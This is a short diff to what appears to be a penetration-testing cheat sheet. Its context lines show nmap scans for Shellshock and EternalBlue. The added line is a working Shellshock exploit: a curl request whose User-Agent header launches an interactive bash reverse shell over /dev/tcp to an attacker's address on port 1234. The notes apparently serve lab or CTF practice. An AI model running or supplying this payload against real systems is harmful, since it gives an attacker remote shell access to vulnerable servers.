@@ -39,6 +39,7 @@
 		  /usr/share/nmap/scripts/http-shellshock.nse
 
 	 :: nmap  --script  http-shellshock.nse  --script-args  uri=/folderTarged/exampla.sh  -p80  $(mvnb)
+	 :: curl -s -X GET "http://$(mvnb)/folderTarged/file.sh" -H "User-Agent: () { :; };echo; /bin/bash -i >& /dev/tcp/ip_vpn/1234 0>&1"
 
 				Ethernal Blue ***
 	::: nmap  --script  "vuln and safe"  -p445  ipHere  -oN  smbVulnScan
